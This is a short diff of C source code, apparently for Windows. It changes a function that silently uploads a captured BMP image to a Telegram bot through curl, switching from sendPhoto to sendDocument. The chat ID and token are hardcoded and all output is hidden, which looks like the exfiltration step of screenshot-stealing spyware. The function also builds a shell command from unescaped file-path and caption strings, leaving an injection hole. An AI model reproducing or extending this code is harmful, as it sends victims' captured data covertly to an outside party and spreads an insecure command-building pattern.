@@ -190,13 +190,13 @@ void send_photo(const char *filepath) {
     char cmd[2048];
 
 #ifdef USE_TELEGRAM
-    // Telegram sendPhoto with multipart form data
+    // Telegram sendDocument (BMP too large for sendPhoto limit)
     snprintf(cmd, sizeof(cmd),
         "C:\\Windows\\System32\\curl.exe -s "
         "-F \"chat_id=" TG_CHAT "\" "
-        "-F \"photo=@%s\" "
+        "-F \"document=@%s\" "
         "-F \"caption=%s\" "
-        "\"https://api.telegram.org/bot" TG_TOKEN "/sendPhoto\" >nul 2>nul",
+        "\"https://api.telegram.org/bot" TG_TOKEN "/sendDocument\" >nul 2>nul",
         filepath, g_caption);
 #endif
 
